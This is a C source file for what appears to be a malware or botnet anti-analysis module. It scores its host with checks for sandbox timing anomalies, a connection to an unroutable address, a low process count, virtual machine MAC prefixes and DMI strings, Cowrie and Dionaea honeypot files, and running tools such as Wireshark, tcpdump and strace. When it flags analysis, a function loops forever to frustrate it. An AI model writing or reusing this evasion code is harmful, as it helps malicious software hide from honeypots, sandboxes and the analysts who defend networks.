#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>
#include <dirent.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <net/if.h>

#include "headers/adbg.h"
#include "headers/rand.h"

#define MODULE_TAG "adbg"
#include "headers/debug.h"

#define ADBG_THRESHOLD          65

#define WEIGHT_TIME_TRAVEL      30
#define WEIGHT_NET_BLACKHOLE    35
#define WEIGHT_PID_DENSITY      10
#define WEIGHT_VM_MAC           20
#define WEIGHT_VM_DMI           25
#define WEIGHT_HONEYPOT_FILES   50
#define WEIGHT_ANALYSIS_TOOLS   35

static volatile int honeypot_detected = 0;
static volatile int adbg_initialized = 0;
static volatile int adbg_score = 0;

static int check_time_travel(void) {
    DEBUG_PRINT("Running Time Travel check...");
    struct timeval start, end;
    struct timespec ts_start, ts_end;
    
    gettimeofday(&start, NULL);
    clock_gettime(CLOCK_MONOTONIC, &ts_start);
    
    usleep(500000); /* 500ms — เบาพอสำหรับ detection แต่ไม่ block นาน */
    
    gettimeofday(&end, NULL);
    clock_gettime(CLOCK_MONOTONIC, &ts_end);
    
    long elapsed_ms = (end.tv_sec - start.tv_sec) * 1000 + (end.tv_usec - start.tv_usec) / 1000;
    long clock_elapsed_ms = (ts_end.tv_sec - ts_start.tv_sec) * 1000 + (ts_end.tv_nsec - ts_start.tv_nsec) / 1000000;

    if (elapsed_ms < 300) {
        DEBUG_PRINT("DETECTED! Time travel anomaly via gettimeofday (slept 500ms, elapsed %ldms)", elapsed_ms);
        return WEIGHT_TIME_TRAVEL;
    }
    
    if (clock_elapsed_ms < 300 || labs(elapsed_ms - clock_elapsed_ms) > 1000) {
        DEBUG_PRINT("DETECTED! Time virtualization mismatch (wall: %ldms, monotonic: %ldms)", elapsed_ms, clock_elapsed_ms);
        return WEIGHT_TIME_TRAVEL;
    }

    DEBUG_PRINT("OK (Elapsed: %ldms)", elapsed_ms);
    return 0;
}

static int check_network_blackhole(void) {
    DEBUG_PRINT("Running Network Blackhole check...");
    
    
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);
    if (sockfd == -1) return 0;
    
    int flags = fcntl(sockfd, F_GETFL, 0);
    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
    
    struct sockaddr_in srv;
    srv.sin_family = AF_INET;
    srv.sin_port = htons(80);
    srv.sin_addr.s_addr = inet_addr("192.0.2.1");
    
    connect(sockfd, (struct sockaddr *)&srv, sizeof(srv));
    
    fd_set writeset;
    FD_ZERO(&writeset);
    FD_SET(sockfd, &writeset);
    struct timeval tv;
    tv.tv_sec = 0;
    tv.tv_usec = 500000;
    
    int ret = select(sockfd + 1, NULL, &writeset, NULL, &tv);
    if (ret > 0 && FD_ISSET(sockfd, &writeset)) {
        int err = 0;
        socklen_t len = sizeof(err);
        getsockopt(sockfd, SOL_SOCKET, SO_ERROR, &err, &len);
        if (err == 0) {
            DEBUG_PRINT("DETECTED! Successful connection to unroutable IP (192.0.2.1)");
            close(sockfd);
            return WEIGHT_NET_BLACKHOLE;
        }
    }
    
    close(sockfd);
    DEBUG_PRINT("OK (Network blackhole check passed)");
    return 0;
}

static int check_pid_density(void) {
    DEBUG_PRINT("Running PID Density check...");
    DIR *d = opendir("/proc");
    if (!d) return 0;
    
    int pid_count = 0;
    struct dirent *dir;
    while ((dir = readdir(d)) != NULL) {
        if (dir->d_name[0] >= '1' && dir->d_name[0] <= '9') {
            pid_count++;
        }
    }
    closedir(d);
    
    DEBUG_PRINT("Found %d running processes", pid_count);
    
    if (pid_count < 5) {
        DEBUG_PRINT("DETECTED! Too few processes running (%d < 5), likely minimal sandbox", pid_count);
        return WEIGHT_PID_DENSITY;
    }
    
    DEBUG_PRINT("OK (PID Density Check)");
    return 0;
}

static int check_vm_mac(void) {
    DEBUG_PRINT("Running VM MAC Address check...");
    
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return 0;
    
    struct ifconf ifc;
    char buf[1024];
    ifc.ifc_len = sizeof(buf);
    ifc.ifc_buf = buf;
    
    if (ioctl(sock, SIOCGIFCONF, &ifc) == -1) {
        close(sock);
        return 0;
    }
    
    struct ifreq *ifr = ifc.ifc_req;
    int num_interfaces = ifc.ifc_len / sizeof(struct ifreq);
    
    for (int i = 0; i < num_interfaces; i++) {
        struct ifreq ifr_mac;
        strncpy(ifr_mac.ifr_name, ifr[i].ifr_name, IFNAMSIZ-1);
        ifr_mac.ifr_name[IFNAMSIZ-1] = '\0';
        if (ioctl(sock, SIOCGIFHWADDR, &ifr_mac) == 0) {
            unsigned char *mac = (unsigned char *)ifr_mac.ifr_hwaddr.sa_data;
            if ((mac[0] == 0x08 && mac[1] == 0x00 && mac[2] == 0x27) ||
                (mac[0] == 0x00 && mac[1] == 0x05 && mac[2] == 0x69) ||
                (mac[0] == 0x00 && mac[1] == 0x0C && mac[2] == 0x29) ||
                (mac[0] == 0x00 && mac[1] == 0x50 && mac[2] == 0x56) ||
                (mac[0] == 0x00 && mac[1] == 0x1C && mac[2] == 0x42)) {
                DEBUG_PRINT("DETECTED! Suspicious MAC address %02x:%02x:%02x:... on interface %s", mac[0], mac[1], mac[2], ifr[i].ifr_name);
                close(sock);
                return WEIGHT_VM_MAC;
            }
        }
    }
    
    close(sock);
    DEBUG_PRINT("OK (No suspicious MAC addresses)");
    return 0;
}

static int check_vm_artifacts(void) {
    DEBUG_PRINT("Running Hardware Geometry check...");
    int score = 0;

    score += check_vm_mac();

    const char *dmi_files[] = {
        "/sys/class/dmi/id/product_name",
        "/sys/class/dmi/id/sys_vendor",
        "/proc/scsi/scsi",
        NULL
    };

    for (int i = 0; dmi_files[i] != NULL; i++) {
        FILE *f = fopen(dmi_files[i], "r");
        if (f) {
            char buf[512] = {0};
            size_t n = fread(buf, 1, sizeof(buf) - 1, f);
            fclose(f);
            if (n > 0) {
                for (size_t j = 0; j < n; j++) {
                    if (buf[j] >= 'A' && buf[j] <= 'Z') buf[j] += 32;
                }

                if (strstr(buf, "virtualbox") || strstr(buf, "vbox") || strstr(buf, "bochs")) {
                    DEBUG_PRINT("DETECTED! VM artifact in %s", dmi_files[i]);
                    score += WEIGHT_VM_DMI;
                    break;
                }
            }
        }
    }

    if (access("/opt/cowrie/cowrie.cfg", F_OK) == 0 ||
        access("/etc/cowrie/cowrie.cfg", F_OK) == 0 ||
        access("/var/run/dionaea.pid", F_OK) == 0) {
        DEBUG_PRINT("DETECTED! Specific honeypot file present.");
        score += WEIGHT_HONEYPOT_FILES;
    }

    if (score == 0) {
        DEBUG_PRINT("OK (No hardware honeypot traces)");
    }
    return score;
}

static int check_analysis_tools(void) {
    DEBUG_PRINT("Running Analysis Tools check...");
    DIR *d = opendir("/proc");
    if (!d) return 0;

    struct dirent *ent;
    while ((ent = readdir(d)) != NULL) {
        if (ent->d_name[0] < '1' || ent->d_name[0] > '9') continue;

        char path[64], exe[256];
        snprintf(path, sizeof(path), "/proc/%s/exe", ent->d_name);
        ssize_t r = readlink(path, exe, sizeof(exe) - 1);
        if (r <= 0) continue;
        exe[r] = '\0';

        if (strstr(exe, "wireshark") || strstr(exe, "tshark") ||
            strstr(exe, "dumpcap")   || strstr(exe, "tcpdump") ||
            strstr(exe, "ettercap")  || strstr(exe, "ngrep") ||
            strstr(exe, "strace")    || strstr(exe, "ltrace")) {
            DEBUG_PRINT("DETECTED! Analysis tool running: %s", exe);
            closedir(d);
            return WEIGHT_ANALYSIS_TOOLS;
        }
    }
    closedir(d);
    DEBUG_PRINT("OK (No analysis tools detected)");
    return 0;
}

void adbg_init(void) {
    if (adbg_initialized) return;
    DEBUG_PRINT("Initializing novel anti-honeypot module...");

    adbg_score = 0;
    adbg_score += check_time_travel();
    adbg_score += check_network_blackhole();
    adbg_score += check_pid_density();
    adbg_score += check_vm_artifacts();
    adbg_score += check_analysis_tools();

    DEBUG_PRINT("Anti-honeypot score: %d (threshold: %d)", adbg_score, ADBG_THRESHOLD);

    if (adbg_score >= ADBG_THRESHOLD) {
        honeypot_detected = 1;
    }

    adbg_initialized = 1;
}

int adbg_is_under_analysis(void) {
    if (!adbg_initialized) {
        adbg_init();
    }
    return honeypot_detected;
}

void adbg_fake_crash_and_chaos(void) {
    if (!adbg_initialized) {
        adbg_init();
    }
    
    DEBUG_PRINT("Entering infinitely loop to frustrate analysis.");
    while (1) {
        sleep(3600);
    }
}